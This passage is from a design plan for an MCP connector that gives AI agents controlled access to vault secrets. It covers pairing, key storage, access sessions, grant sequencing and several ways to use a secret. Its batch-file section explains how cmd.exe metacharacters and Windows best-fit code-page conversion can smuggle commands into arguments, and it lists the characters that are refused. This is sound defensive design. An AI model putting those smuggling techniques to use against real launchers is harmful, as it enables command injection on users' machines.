| `internal/protect` | Protectors behind one interface: `passphrase`, `tpm` (Linux), `keychain` (macOS, cgo), `dpapi` (Windows); build tags per OS |
| `internal/vaultconn` | The connector's use of `client.Device`: one goroutine that owns it, collects and dispatches (until AV2 exists in the client), persists before acking (AV1), token and rekey maintenance, `device.unlinked`, `token_revoked` |
| `internal/access` | Access sessions (§6.8): request policy (AG8), granted, ended, expiry, `session_required`, `owner_check_required` |
| `internal/leash` | Grants, suspension, status statements (cache and refresh), `agent.request` with referred requests, pending results (AG9) |
| `internal/mcp` | The MCP server: tool definitions and handlers, the local rate limit, the stdio transport |
| `internal/pairing` | Code parsing (bare payload, `https://…/connect#…`, `vettid://connect#…`, inside surrounding text, §6.4), the pairing flow and its texts |
| `internal/devstack` (test only, build tag `devstack`) | Starting or finding a dev stack, driving `vaultctl` as the member's app, the dev relay mapping (§4.8) |
| `testdata/vectors/` | Copies of the vault's vectors used here, with `SOURCE.md` (§5), and the connector's own (`statefile.json`) |

Rules: only `internal/vaultconn` touches `client.Device`; only
`internal/state` and `internal/protect` touch keys at rest; `internal/mcp`
sees results, never keys. Logs (`log/slog`) carry ids, types, sizes and
error codes, never bodies, item values, codes or SAS.

### 3.2 Reusing vettid-vault's client (AG2)

Established on vettid-vault `1ef2dd9`:

- Module `github.com/vettid/vettid-vault`, public, AGPL-3.0 (vettid-agent
  is AGPL-3.0 too). No tags: depend on a pseudo-version of a `main`
  commit, recorded in `docs/SOURCE.md`, updated by its own PR.
- `client` and `vms/*` are not under `internal/`. They import
  `internal/strictjson`, `internal/cbor` and `internal/der`, which Go
  allows because the importing package is inside the vault module; a
  test build of an external module importing `client` and
  `vms/leashwire` compiles.
- Non-standard dependencies compiled in: `vettid-relay`'s `relayclient`
  and `relayauth`, `coder/websocket`, `golang.org/x/crypto` and
  `x/text`, and **btcsuite/btcd and decred secp256k1**, which come only
  from `client/wallet.go` (AV4 would remove them). No AWS SDK
  (the parent's dependencies stay out). About 5 MB stripped.
- Exported signatures return `strictjson.Object`, an internal type:
  usable through type inference (`o, err := d.Op(...)`), not nameable.
  The connector uses `Request`/`Send` with its own JSON types where it
  must name them.
- Limits for a long-running process: every waiting call (`Request`, `Op`, `WaitEvent`,
  `LeashPresent`) collects from the relay itself; `Poll` acknowledges
  each message right after handling it, before the caller can save the
  state; `approval.waiting` does not extend a wait; no application
  retries (§8.6); `device.unlinked` is an ordinary event. §7.1 lists
  the client changes; until they land, `internal/vaultconn` owns the
  device in one goroutine and uses only `Send`, `SendWithID`, `Poll`,
  `Events` and `Save`.

### 3.3 Runtime

```
MCP client ──stdio──> vettid-agent mcp ──relay (HTTPS)──> vault mailbox
                        │ started and stopped by the MCP client
                        │ owns the state file (locked) and client.Device (one goroutine)
```

`vettid-agent mcp`: loads the state (protector), takes the lock (or
exits with "in use by another agent app"), collects what arrived while
it was not running, then collects by long poll, dispatches responses by
`re` to waiting tool calls, handles events (`device.session.granted`,
`.ended`, `approval.waiting`, `leash.grant.updated`, `relay.token.*`,
`identity.rotate`, `device.unlinked`), saves the state before
acknowledging a batch, and refreshes status statements. It writes only
MCP messages to standard output and logs to standard error. `pair`,
`status` and `forget` are run by the operator in a terminal and take the
same lock (`status` while a client runs says so and shows what the state
file holds).

## 4. Connector-specific matters

### 4.1 The MCP tools (AG1, AG1a, AG5)

Names follow LEASH §3.3 where it has one; VAULT-MESSAGING §10.11 gives
the mapping. Every tool returns MCP tool errors with a stable `code`
(the vault's error code, or the connector's own: `not_paired`,
`access_requested`, `access_denied`, `vault_unreachable`,
`owner_check_required`, `suspended`, `rate_limited_local`,
`superseded`: another copy of the request under the same request id
took its place, so its answer cannot be returned here, AG9; and
(0.1.15, vettid-agent #48) `withheld`: the vault's answer with the
value was lost twice, §4.4). With AG13
the vault adds `way_not_allowed` (body `{ways}`) and
`program_not_allowed`, and the connector `program_not_found`,
`run_failed`, `proxy_limit`, `proxy_not_found` and (0.1.15, vettid-agent
#42) `argument_not_allowed` (§4.9). With
VAULT-MESSAGING 0.85.3 the vault adds `env_not_allowed` (body
`{names}`), which the connector also returns itself before sending
once A3.8b wires runs (§4.9), and the connector `vault_too_old` (§4.5). (0.1.16, AG14) The connector also returns `separate_account_required` for a run or a proxy without the service (§4.9). (0.1.17) The stub returns `service_not_running` (no service) and `versions_differ` (the service and the stub are different versions) for every tool (A3.10a, §11). With VAULT-MESSAGING 0.93.0 the vault adds `cwd_not_allowed` (body `{where, path}`: an `item.run` whose `cwd`, an input file or its output folder is outside the item's `folders`); the connector also returns it, with the same text, when the folder is in the binding but not shared on this computer (`vettid-agent share`) or its real location is outside the shared folder (§4.9; not built); it is the working folder only, since files in and out need no share. It uses two texts, one for a working folder and one for `where: input` or `output` (§11). (0.1.17) A connector whose catalog entry for the item has no `folders` (a vault before VAULT-MESSAGING 0.93.0) answers `vault_too_old` for a run with `inputs`, `output` or a `cwd` outside `work/` (§4.9, §11). (0.1.17) The stub also returns `config_refused` when the pipe's configuration folder or file fails its checks (A3.10a, §11), and `member_is_admin` for every tool when the service refuses a member whose token holds Administrators (A5.5, §11; owner decision a, GC #15862).

| Tool | Vault request | Input | Result |
|---|---|---|---|
| `leash.list_available` | `agent.request{op: "catalog"}` | — | `{items: [{item_id, name, category, labels, ways, programs?, folders?, hosts?}]}` (never values, tags or rules; `ways` and the bindings since AG13; `folders` is `[{path, write}]`, 0.1.17) |
| `leash.request_secret` | `agent.request{op: "item.get"}` | `{item_id, fields?}` | the item, as text only (§4.9 "Reveal"), or `{status: "pending", request_id}` (AG9); only for an item whose ways include `reveal` |
| `leash.run_with_secret` (AG13) | `agent.request{op: "item.run"}`, then the run (§4.9) | `{item_id, field_id, argv, cwd?, how: "env" \| "stdin" \| "file", name?, env?, timeout_seconds?, inputs?, output?}` ((0.1.17, not built) `inputs`: `[{path, size}]`, `output`: `{folder, names}`; VAULT-MESSAGING 0.93.0 §10.11) | `{exit_code, signal?, timed_out, stdout, stderr, truncated, redacted, outputs?}`, or pending; (0.1.17, not built) `outputs: [{name, size, copied, redacted, reason?}]` for each named output; when `copied` is false, `reason` is one of `size` (over a cap), `link` (a link, reparse point or link count over 1), `owner` (not the slot's runner's file), `binding` (the binding no longer allowed the copy) or `missing` (§4.9) |
| `leash.open_proxy` (AG13) | `agent.request{op: "item.proxy"}` (always referred) | `{item_id, field_id, host, seconds?}` | `{base_url, host, expires_at}`, or pending |
| `leash.close_proxy` (AG13) | — | `{base_url}` | `{}`; `proxy_not_found` |
| `leash.execute_action` | `agent.request{op: "item.use", action: "hmac-sha256"}` | `{item_id, field_id, data}` (`data` as text, or base64 with `data_encoding: "base64"`; 1–16,384 bytes) | `{result}` (base64 HMAC-SHA-256), or pending |
| `leash.check_status` | (the held request's response, §6.8) | `{request_id}` | `pending`, the result, or the error |
| `leash.connection_info` | `vault.status`, `leash.grant.list` (cached) | — | paired vault id, last contact, access session and its expiry, grants (scope, approval, limits, expiry, connections), `suspended` |
| v1.1: `vettid.connections.list`, `.get`, `vettid.messages.send`, `.list`, `.get`, `.read`, `vettid.profile.get`, `vettid.actions.list`, `.invoke` | the delegable owner types (§10.11) | as §10.4, §10.5, §10.8, §10.14 | as there; a message's attachment is never shown (§10.5.1 "Agents") |

Tool descriptions say plainly that values come from the member's vault
and give AG13's order: `leash.execute_action` where it suffices (the
value never enters the agent's context), then `leash.run_with_secret`,
then `leash.open_proxy`, and `leash.request_secret` last. The local rate limit (a token
bucket, 120 burst, 2 per second, per process) answers
`rate_limited_local` before anything reaches the vault. After a
`forbidden`, the connector does not retry on its own; the vault's
cooldowns (§10.11) make repeated refusals slower and can suspend the
connector.

### 4.2 Keys at rest (AG3)

- **What is secret**: the client's state (`client.State`: `ik_seed`,
  `kem_seed`, `relay_seed`, the vault record with tokens and the session
  keyring). Ed25519 and X-Wing keys cannot live in a TPM, the Secure
  Enclave or DPAPI as non-exportable keys, so the seeds are software
  keys wrapped by a key that the platform protects.
- **Format** (`internal/state`, vectors in `statefile.json`): a small
  JSON header `{v: 1, protector, wrapped_key, nonce, created_at}`,
  then XChaCha20-Poly1305 of the state under the data key with the
  header bytes as associated data. Written to a temporary file in the
  same directory, synced, renamed. A new data key at each pairing.
- **Owner-only**: directory 0700 and file 0600 on POSIX, checked on load
  (refuse a group- or world-readable state); on Windows the DACL of PR
  #4's design, checked on load.
- **Why not the old platform key.** It was an HMAC over attributes any
  local process can read (and the MAC address is visible on the local
  network), so it added obscurity, not a secret; it broke on hardware
  changes (hence `rebind`) and failed on Windows. A TPM-sealed key,
  a this-device-only Keychain item or DPAPI give what LEASH §3.4 asks
  ("Copying credentials to another machine MUST render them
  undecryptable") with keys the attacker cannot recompute.
- **Headless.** The passphrase protector (Argon2id, at least the
  vault's parameters for passwords, VAULT-MESSAGING §4.1; the strength
  rules of §1) is portable by nature: the file and the passphrase open
  it anywhere. `vettid-agent status` says "not bound to this computer"
  for it, and the plan records that this mode does not meet LEASH
  §3.4's platform binding.
  (Owner decision, 2026-10-17.) A passphrase file, or a regular file
  given by descriptor, must be owner-only on every platform: mode 0600
  or 0400 and owned by the operator on POSIX, and on Windows the same
  owner-only DACL check as the state file.
- **Windows: domain accounts and roaming profiles** (owner decision,
  2026-10-18). User-scope DPAPI binds the keys to this computer only for
  a local or Microsoft account without a roaming profile. For a domain
  account the organization can recover the keys; with a roaming profile
  they open wherever the profile is loaded. The connector does not
  refuse either: `pair` (when it chooses DPAPI) and `status` show a
  notice (§11). A domain account: the computer is joined to an Active
  Directory domain and the user's account domain is not the computer's
  name. A roaming profile: `GetProfileType` says roaming, or the user's
  `ProfileList` entry has a `CentralProfile`. A check that fails gives
  no notice (a debug log only), so no notice is not a guarantee.
- **macOS** (owner decision, 2026-10-18, option A). Only the data
  protection keychain is used: the item is
  `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` and not
  synchronizable. That keychain needs a `keychain-access-groups`
  entitlement authorised by a provisioning profile, so only the signed
  app bundle (`vettid-agent.app`, built in A5 with the owner's App ID
  and Developer ID provisioning profile) can use it. A bare or unsigned
  binary gets `errSecMissingEntitlement`; the connector then uses the
  passphrase protector and says why. The file-based login keychain is
  not used: it silently drops `ThisDeviceOnly`, its items travel with
  Time Machine and Migration Assistant, and its access list makes a
  rebuilt binary hang on a prompt.
- **In the separate-account mode** (0.1.16, AG14; AGENT-SEPARATE-ACCOUNT
  §3 "Keys at rest"; nothing built). The state is under the connector's
  account, in a folder only that account can open (`%ProgramData%\VettID\agent\<n>\`,
  `/var/lib/vettid-agent/<n>/`, `/Library/Application Support/VettID/agent/<n>/`).
  - **Windows:** DPAPI of the connector's virtual service account. Its
    master key is protected by LSA secrets, so any SYSTEM process can
    decrypt it. The roaming-profile and domain-account notices above no
    longer apply. The runners' random passwords are kept under the same
    DPAPI. The connector's account is always the virtual service
    account (0.1.19, the owner's decision, GC #15936; the CI probe of
    vettid/vettid-agent#53 showed it needs no privilege beyond
    `SeChangeNotifyPrivilege`, A3.10b).
  - **Linux:** `LoadCredentialEncrypted=` sealed to the TPM 2.0
    (systemd-creds), preferred over putting the service user in the
    `tss` group; never a passphrase typed at start (a service cannot
    prompt). The TPM-or-passphrase rule of AG3 is for the same-account
    connector. **A key-handling change, said plainly** (a security path,
    §9 rule 6): the elevated `pair` generates the data key and seals it
    as the systemd credential, where today the connector does (a new
    data key at each pairing; any later rotation also goes through an
    elevated command). It gets its own independent review before code,
    as A5.4 says for macOS. A machine without a TPM 2.0 (owner c, GC #15786):
    `install` stops with a clear message unless `--no-tpm` is given. With
    `--no-tpm` the credential is sealed to systemd's host key, which
    root can read and which is not bound to hardware; `install` says so
    in its output and `status` shows it. (The lead's call) `--no-tpm` on a
    machine that has a TPM 2.0 is refused with a clear message (§11).
  - **macOS:** the System keychain with an access list naming the
    connector, created by the elevated `pair`, as in A5.4 (the data
    protection keychain needs a logged-in user, which a daemon never
    has), subject to A5.4's keychain check (note §3: it may not work
    for a daemon that is not root). Runs and proxies wait for signed
    builds (Q4 c).
  - `forget` is an elevated command in this mode (§4.7).
  - **Wipe in the separate-account mode** (0.1.16). The service cannot
    delete its own sealed credential (Linux) or keychain item (macOS):
    the elevated `forget` does. On `device.unlinked` (AG12) the service
    deletes the state file it owns, stops using the credential or item
    and marks the pairing gone; the sealed credential or item stays
    until an elevated `forget` removes it, and `status` says so. On
    Windows DPAPI keeps no key outside the file, so the state file's
    deletion is the wipe. The elevated commands are listed in §4.7.
- **Wipe** (`forget`, `device.unlinked`): overwrite and delete the state
  file, delete the protector's key (the Keychain item; the TPM and
  DPAPI protectors keep none outside the file), drop the
  in-memory device. A behavior change here is a §9 rule 6 path.
  (Owner decision, 2026-10-17.) The TPM protector keeps no object on
  the TPM: the sealed object lives only in the state file. So after
  `forget`, an old copy of the state file recovered from the disk (a
  backup, a snapshot, an SSD's remapped blocks) can still be opened on
  the same computer until its TPM is cleared. Opening such a copy needs
  the copy (from a backup, a snapshot or the raw disk) and access to
  that computer's TPM; DPAPI behaves the same way. Accepted for v1, and said in the README.

### 4.3 Pairing (§6.7)

1. The member opens Devices & agents on the phone and chooses "Pair an
   agent" (§7.2); the app sends `device.pair.create{role: "agent"}` and
   shows the QR and the code (the bare payload; pairing links stay bare,
   §6.4). A connector runs on a computer without a camera as a rule, so
   the member copies the code to it; the SAS comparison is what makes
   that safe (§6.4 "accepting with it is caught by the SAS comparison").
2. `vettid-agent pair` reads the code (argument, prompt or standard
   input; never logged), checks `t = "a"`, the hash and the expiry
   (§6.4), creates fresh keys (`client.New`, role `agent`, the AG11
   name), sends `hs.init`, and prints the six-digit SAS.
3. It waits for `device.paired` or `device.pair.rejected` until 10
   minutes after its `hs.init` (0.10.4, 0.10.5), saving the state after
   each step. On `device.paired` it records the device id and, if
   `session_expires_at` is present, the first access session; it then
   asks for its grants (`leash.grant.list`). A re-pairing always uses
   new keys (a re-paired device's old relay key stays denylisted, §6.7).
4. **Its own session after a start.** No message returns an agent's
   current access session today (`vault.status` has only a device
   count; `device.list` is for apps and desktops), so at start the
   connector probes with `leash.grant.list` (`session_required` means
   none). Decided by the owner (2026-10-18; VAULT-MESSAGING 0.41.0):
   `vault.status` returns the calling device's own `session` (AV8). The
   probe stays until the vault ships it; then the connector reads
   `session` from the `vault.status` it already sends at start.

### 4.4 Access sessions and approvals (§6.8)

- Without a session the vault answers the connector's requests
  `session_required` or `forbidden` and drops other messages; only
  `vault.status`, `device.session.request`, `device.session.end` and the
  transport types pass. The connector checks its known session expiry
  before sending, and asks per AG8.
- A grant replaces the current session, so a request within a session
  renews it; the connector renews on request only, never silently.
- Referred and held requests: `approval.waiting{approval_id,
  request_id, exp}` makes the connector wait until `exp` (+ 30 s) for
  the response instead of the usual 30 s (§8.1); a retransmission reuses
  the inner `id` (at most twice, §8.6), and the vault's dedupe answers
  it. (0.1.13) For `item.get`, `item.run` and `item.proxy` the dedupe's
  answer is a copy without the secret value (VAULT-MESSAGING 0.91.1
  §8.2): a run or proxy answer without `value`, or an `item.get`
  answer with a field without `value`, means "ask again as a new
  request". (0.1.14) Every such copy carries `withheld: true`
  (VAULT-MESSAGING 0.92.0, owner decision a, GC #15273; vault card GC
  #15279), which the connector checks first; the missing `value` stays
  as a backstop. (0.1.15) As built in vettid-agent #48:
  - The marker is checked first, for every op, before anything else in
    the answer is read, so stale values a copy may still carry never
    reach the result or the log. `withheld` with any other value
    (`false`, `null`, a string, a number) is `protocol_error`: a live
    answer never carries the member.
  - The backstop is `item.get`'s: a field without `value` means a copy.
    A `null` `value` is no longer read as "no stored value"; it is
    `protocol_error`.
  - The connector asks again **once** (`AskAgain = 1`; chosen, not in
    the spec, since each new request may prompt the member again), as a
    new request under a new inner id. The tool's `request_id` stays, so
    `leash.check_status` keeps working; `approval.waiting` naming the
    old inner id is ignored. Asking again renews no access session.
  - A second copy ends the request with `withheld` (§11 "Answer lost").
    A refusal of the new request is the outcome; the agent never gets
    an empty item (except the notes-only case below).
  - Nothing is asked again when the tool call ended without its
    `request_id` (nobody waits for it), when the agent is suspended
    (`suspended`) or when the vault is known held
    (`owner_check_required`).
  - A notes-only item's copy from a vault without the marker is not
    caught (it arrives as an item without fields); the vault side
    (vettid-vault #285) ships first or together.
  - `item.run` and `item.proxy`: the marker check sits before the op
    switch, so it will apply once A3.8b and A3.9 add those ops; their
    "without `value` starts nothing" backstop is built with them.
- **Held vault** (§3.6.3): `owner_check_required` for everything but
  `vault.status` and `device.session.end`; status statements lapse within
  `status_ttl`. The connector reports "Your vault is waiting for your
  daily check" and does not retry until a successful `vault.status`
  shows the vault is not held. (Owner decision, 2026-10-18.) Neither
  `leash.grant.updated` nor `device.session.granted` ends the hold:
  events arrive in no order (VAULT-MESSAGING §8.4), so one sent before
  the hold can arrive after it. While held, the connector sends
  `vault.status` again at most once a minute, from tool calls.
- **Locked vault** (§12.1): requests wait in the vault's mailbox and get
  no answer; after 30 s the tool answers `vault_unreachable` with the
  request kept in flight (AG9), and statements lapse.

### 4.5 Grants and status statements (§10.11)

The connector keeps its grants from `leash.grant.updated` and
`leash.grant.list` (fetched at every session start: the vault sends
`leash.grant.updated` only within a session, and initial grants reach
the connector at pairing only when the approval also granted a session).
It never presents a delegation that is not among its current grants, and
presents none while `suspended` is true (chosen; not in the spec:
the vault issues no statements then anyway). Status statements are
refreshed when less than a quarter of their lifetime (at least a minute)
remains, as `client.LeashPresent` does.

**Grant-set sequence numbers** (VAULT-MESSAGING 0.41.0 §10.11; vault
AV7, connector A3.5). Events and answers arrive in no order (§8.4), so
a `leash.grant.list` answer sent before a revocation could be applied
after it and bring the revoked grant back. Each `leash.grant.updated`
and each agent's `leash.grant.list` answer carries the `grant_seq` of
the set it describes. The connector keeps the highest `grant_seq` it
has seen, in the state file. It ignores a list or update with a lower
number. One with an equal number describes the same set: the connector
keeps its set and takes only fresher status statements from it (the
vault sends the same set again with fresh statements, for example when
a hold ends). A re-paired connector starts with new state, and the
vault's numbers for it start at the vault's current value, not 0.
The connector needs a vault that sends `grant_seq` (AV7; owner
decision of 2026-10-18: no fallback for older vaults): it ignores a
list or update without one, so A3.5 is released only after AV7 is on
staging.

The lead's rules for A3.5 (2026-11-05):

- **Higher, lower, equal.** A higher `grant_seq` replaces the set,
  whether it comes in a list or an update, so it can add grants as well
  as remove them. A lower one is ignored. An equal one keeps the set and
  takes only the newer status statements.
- **Marks learned outside the sets.** (0.1.13, as built in
  vettid-agent #43) Only a `leash.status.get` answer marks: `not_found`
  marks that grant dead, and `forbidden` marks the agent suspended, so
  nothing is presented. An `agent.request` answer `forbidden` names no
  grant: it marks nothing and asks for a fresh list at once (not
  waiting out the pause after failed lists, except for a vault known
  to be too old for `grant_seq`), whose number says whether the agent
  was suspended or a grant revoked. The connector keeps its counter
  `gen` for these marks only.
  A list answered before the revocation can carry a higher number than
  the connector's and would bring the grant back, so a mark is cleared
  only by the answer to a list this process sent after learning it,
  with a number at least the one kept. An equal or higher number alone
  never brings a dead grant back.
- **"Listed in this session".** An equal number counts as listed in
  this session only as the answer to this process's own list, never as
  an event.
- **Pairing.** The connector does not record the `grant_seq` of the
  `leash.grant.updated` in the `device.paired` batch: a number kept
  without its set would make a later list with the same number keep an
  empty set.
- **Without.** A `grant_seq` of 0, absent, or not an unsigned 64-bit
  integer counts as absent (VAULT-MESSAGING 0.85.3), and the list or
  update is ignored.
- **An old vault.** An ignored list counts as a failed list: the
  connector tries again after 15 s, doubling to 5 minutes, logs it once
  per session, and answers tools that need grants with `vault_too_old`
  and its text (§11; owner decision of 2026-11-05).
- **State.** The state file's header `Version` stays 1. Its `leash`
  member goes to `"v": 2` and holds `grant_seq`. A `"v": 1` member reads
  as "number unknown": only the answer to this process's own list
  widens it.

**Delegation checks** (owner decision, 2026-10-18; deliberate). Agents
never get the member's credential key. The connector checks a
delegation's signature under its own `iss`, and that its members match
the grant's, for internal consistency only; it does not decide whether
`iss` is the member's key. The vault enforces delegations; a relying
party checks `iss` against the key it trusts for the member
(VAULT-MESSAGING §10.11, verification step 1).

### 4.6 Offline, tokens and relay retention

The vault's standing token for the connector lasts at most 30 days and
the relay keeps messages 14 days (RELAY-PROTOCOL `message_ttl_seconds`
1,209,600). The vault re-mints tokens with under 10 days left at each
unlock and sends `relay.token.issued` (§7.2); the client also re-issues
its own token to the vault before it ends. A connector whose MCP client
runs it at least every two weeks never lapses: on start it collects what
waited at the relay. One that stays off longer can miss a re-issued
token (the relay keeps it 14 days), and after about a month can find
its token expired and the re-issued one gone from the relay; then it
re-pairs: the owner confirmed this as the recovery (§7.3 Q4,
VAULT-MESSAGING 0.40.0 §7.2).

(0.1.16, AG14; AGENT-SEPARATE-ACCOUNT §5.) In the separate-account mode
the service is started on demand (socket activation; on Windows, by the
stub) when a stub connects and catches up on start as above. After the
last stub leaves it reaches the vault only while a run is in flight (a
referred run still waiting for approval counts) or a run's answer is
kept for `check_status` (10 minutes), then stops after its idle time
(§4.9). So "runs it at least every two weeks" means a stub connects at
least that often. After a resume or a jump in the clock the service
treats its access session as unknown until a `vault.status` answers
(§4.4); runs and proxies wait for that answer.

### 4.7 What the connector never does

Stores or logs an item value, an SAS or a pairing code; caches a
secret beyond the one tool result (a run keeps it in memory until its
process ends, a proxy until it closes, §4.9); retries a `forbidden`;
sends anything to a service other than the vault's relay (except a
proxy's requests to its item's bound host, §4.9); runs as root or
SYSTEM; listens on a network interface or a local socket (except a
proxy's listener on 127.0.0.1 while an approved proxy lasts, §4.9, and
(0.1.16, AG14) the local channel of the separate-account mode: on
Windows a named pipe whose access list gives only the member and the
service access (and, for `pair`, `forget` and `status` only, never for
tools, an elevated administrator at high integrity or above, or root;
the lead's call), on Linux and macOS a Unix socket made by the service
manager, with the peer's user id checked; AGENT-SEPARATE-ACCOUNT §4).
(0.1.16) "Runs as root or SYSTEM" is about the connector service and its
runs, which never do. Elevated by design in that mode: `install`,
`pair`, `forget`, the uninstaller and upgrades (and, on macOS, the
package's `postinstall`), which an administrator starts from the
administrator-only path (note §5), and the POSIX run helper, a small
root service that starts a program only as a runner account and never
as root (note §3). `share` is not built: it is card #15814 (A5.5a; 0.1.17)
(AG14), and until then runs use `work/` only. **(0.1.16, the lead's
call)** The service accepts `pair` and `forget` only from a client
whose token shows an elevated administrator (A3.10a, A3.10b).

### 4.8 The dev-stack harness (AG7)

- vettid-vault's `cmd/devstack` (README "Local dev stack for app
  development"): the real relay, LocalStack, the parent, the dev enclave
  with all optional features (`-features all`, `leash` included), the
  member API stand-in and the control port. One stack at a time; it
  refuses to start below `-wait-free-mem` (8 GB by default).
- **The member's app is `vaultctl`** (dev build, which the dev stack
  builds into its data directory): `vaultctl init -role app`, `api-enroll`
  with a fresh test GUID and PIN (as the dev stack enrolls its peer),
  `credential create` and `credential unlock` (grants need the unlock
  window), `device.pair.create{role: "agent"}`, `device.pair.approve`
  with `session_seconds` and `grants`, `share set -agent` for
  `items.read`, `approval.decide`, `leash revoke|resume`,
  `device.unlink`. The first step of A2.4 is to confirm this sequence on
  the dev stack; if a step is missing, it becomes a vettid-vault PR
  (AV5) and is reported in a vettid.org issue.
- **Relay origin**: tokens name `https://relay.vettid.test`; test builds
  of the connector map it to the dev stack's TLS front with the test
  root from `GET /dev/trust` (as `vaultctl` does with
  `VAULTCTL_DEV_RESOLVE`), through `client.Config.HTTP`. That code
  exists only under the `devstack` build tag, and a release check fails
  if it is linked into a release binary.
- **The separate-account mode** (0.1.16, AG14; AGENT-SEPARATE-ACCOUNT
  §10). The dev-stack tests of the service run it under test accounts
  made for the test (on Windows the pipe, DPAPI, run and cleanup
  tests listed in A3.10a to A3.10c and A5.5), never the implementing
  agent's own account.

### 4.9 Four ways to use a secret (AG13)

**Why.** `leash.request_secret` hands the value to the agent's app.
Many MCP clients keep every tool answer in their chat history or in
logs on disk, so the value may stay there indefinitely; and an answer
that follows MCP's advice to send both `structuredContent` and a text
form carries the value twice. So the connector offers four ways, best
first, and the agent uses the best one the item allows for its task
(VAULT-MESSAGING 0.42.0 §10.11 "Ways to use a secret"):

| # | Way | Tool | The value reaches |
|---|---|---|---|
| 1 | Use without seeing | `leash.execute_action` (`item.use`) | the vault only |
| 2 | Run a command with the secret | `leash.run_with_secret` (`item.run`) | the connector and the one process it starts |
| 3 | Local proxy for an API key | `leash.open_proxy` (`item.proxy`) | the connector and the item's bound host |
| 4 | Reveal | `leash.request_secret` (`item.get`) | the agent and its app |

The member allows, per agent and item, a set of ways (`use` always);
`leash.list_available` shows each item's `ways`, its allowed `programs`
and its `hosts`. The connector does not pick a way for the agent; a
request the item does not allow is answered `way_not_allowed` with the
allowed ways, so the agent can choose again.

**Run** (`leash.run_with_secret`; vault `item.run`).

- **The command.** `argv` is 1–64 strings (each at most 4,096 bytes,
  32,768 in all). No shell is involved unless `argv[0]` is one: the
  connector starts the program directly. `argv[0]` is an absolute path
  (an existing regular file, executable by the operator) or a bare name,
  which the connector looks up on its fixed search path only: on POSIX
  `/usr/local/bin:/usr/bin:/bin` (on macOS also `/opt/homebrew/bin`),
  on Windows `%SystemRoot%\System32;%SystemRoot%`, plus the directories
  the operator adds with `--run-path`. Never the agent's or the
  inherited `PATH`, which may name directories the agent can write. A
  relative path with a separator is refused (`program_not_found`); on
  Windows `/`, `\` and a volume name (`C:`) each count as one (the
  lead's answer, 2026-11-05). Symbolic links are resolved; the result
  is the `program` the vault checks against the item's `programs` and
  the phone shows. (0.1.13) The vault refuses a `program` with a `~`
  in its last element (`bad_request`, VAULT-MESSAGING 0.91.1: on Windows
  an 8.3 short name), and flags launchers and evaluators `shell`, so
  they are always referred; it compares names without `.exe`, `.com`,
  `.cmd`, `.bat` or `.ps1` endings for that flag. A run answer with
  `withheld: true` (0.1.14) or without `value` (the vault's cached
  copy, VAULT-MESSAGING §8.2) starts nothing; the connector asks again
  as a new request (§4.4; the marker check is built, vettid-agent #48,
  and applies once A3.8b adds runs, with the missing-`value` backstop).
- **What is refused as a program** (2026-11-05; the owner's decisions
  and the lead's design notes): on Windows a program without one of
  the extensions `.exe`, `.com`, `.cmd` or `.bat` (a bare name is
  looked up as `.exe`, then `.com`, only; a batch file is found only
  when named with its extension),
  a UNC path, a stream name (`file:stream`), a drive that is not a
  fixed local NTFS or ReFS drive (owner decision 2026-11-05; NTFS only
  for a batch file, below), and a junction or
  other reparse point anywhere in the resolved path (also caught at the
  hold: the held file's final name must equal the resolved path); on every platform,
  a path that is not a regular file the operator may run, and a script
  (`#!`, below, (owner decision 2026-11-05)). Each is `program_not_found`, with the
  reason in the log.
- **Windows batch files** (`.cmd`, `.bat`; owner decision b, GC #14880;
  as built in vettid-agent #42). `cmd.exe` parses a batch file's
  arguments again, so a batch run is allowed only with every value it
  sees checked, fail closed (`argument_not_allowed`, §11):
  - **Refused in an argument, the value of a variable the request
    sets, and the secret when given in a variable:** any of `% & | < > ^ ( ) ! "`, a control
    character (below U+0020, and DEL), and any character outside ASCII.
    Why: `%` expands even inside quotes; `& | < >` run or redirect once
    `%~1` strips the quotes; `( )` end a block early; `^` is dropped by
    `%~1`; `!` expands under delayed expansion; `"` cannot be escaped;
    a line break ends the command; a non-ASCII character can be
    converted by best fit to `"` or `\` (U+FF02, `¥`).
  - **The batch file's path, its working folder and the account
    variables it is given** (vettid-agent #51; owner decisions b, a and a,
    GC #15715, #15728, #15742; measured on Windows 11, GC #15712):
    `cmd.exe` passes non-ASCII unchanged, and the risk is a child that
    reads its command line in the ANSI code page, where Windows' best fit
    turns some characters into metacharacters. So these may hold
    non-ASCII characters, but the ASCII refused set and control
    characters stay refused, and so does any non-ASCII character that
    `WideCharToMultiByte` with the system's code page (`GetACP`, read at
    each run; best fit on) turns into a byte in the refused set, a `\`,
    `/` or `:`, a control byte or DEL, a DBCS second byte included (on
    cp932, for example, タ ends in `^`); a character that becomes `?` is
    allowed, and a failed conversion, or bytes that aren't UTF-8, refuse. A path such as
    `C:\Program Files (x86)\…` still cannot hold a batch file that runs
    with a secret.
    - The account variables are those copied from the connector's
      own environment, `USERPROFILE`, `USERNAME`, `HOMEDRIVE`,
      `HOMEPATH`, `APPDATA` and `LOCALAPPDATA` (which neither the request
      nor `--run-env` can set). They also may not end in a backslash,
      except exactly `HOMEPATH=\` (a mapped home drive's root, GC
      #15742; a batch file that quotes `"%HOMEDRIVE%%HOMEPATH%"` then
      hands a C-runtime child `"H:\"`, an accepted residual).
    - `PATH`, `TEMP` and `TMP`, which the connector sets, get only the
      code-page check and may not end in a backslash: the ASCII part
      would refuse a `--run-path` under `C:\Program Files (x86)`. A
      drive's or share's root is refused as a `--run-path`
      (`CheckRunPaths`; the flag itself comes with A3.8b).
    - The check relies on the connector having no UTF-8
      `activeCodePage` manifest (`GetACP` would then report 65001); a
      test fails and the release-binary check refuses if one appears.
  - **Also refused:** an argument or variable value that ends in a
    backslash (`\"` would become an escaped quote for a program that
    follows C-runtime rules); a working folder that is a drive's root;
    a variable named as one `cmd.exe` sets itself (`CD`, `DATE`,
    `TIME`, `RANDOM`, `ERRORLEVEL`, `CMDEXTVERSION`, `CMDCMDLINE`,
    `HIGHESTNUMANODENUMBER`, `__CD__`, `__APPDIR__`, any case), even a
    `--run-env` one (the secret's own variable name is not yet checked
    against this list: A3.8b); and a secret given in an environment variable whose
    bytes break any of these rules (§11 "Secret not for a batch
    file": use `file` instead). The connector's own `SystemRoot`,
    `windir`, `SystemDrive`, `PATHEXT` and
    `NoDefaultCurrentDirectoryInExePath` are exempt; its `PATH`, `TEMP`
    and `TMP` get the code-page check below.
  - **Allowed:** space and every other printable ASCII character, so a
    batch file that uses `%~1` bare (`if %~1==x`) can still be steered
    by spaces. The rule protects batch files that quote what they are
    given (`"%~1"`) or pass `%*` on, as npm's shims do.
